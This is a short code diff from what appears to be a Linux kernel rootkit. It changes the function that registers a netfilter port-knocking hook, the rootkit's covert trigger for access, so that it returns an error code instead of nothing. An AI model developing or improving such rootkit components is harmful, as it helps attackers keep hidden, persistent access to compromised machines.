@@ -56,7 +56,7 @@ knocking_hook (const struct nf_hook_ops *ops,
 }
 
 /* enable port knocking */
-void
+int
 load_port_knocking (char *ipv4_addr, unsigned int port_number)
 {
 	int ret;
@@ -80,11 +80,12 @@ load_port_knocking (char *ipv4_addr, unsigned int port_number)
 
 	if(ret < 0) {
 		ROOTKIT_DEBUG("Error enabling port knocking. Return of nf_register_hook = %d\n", ret);
-		return;	// TODO: an int return value function would probably be better for loading
+		return ret;
 	}
 
 	/* log our success */
 	ROOTKIT_DEBUG("Done.\n");
+	return 0;
 }
 
 /* disable port knocking */
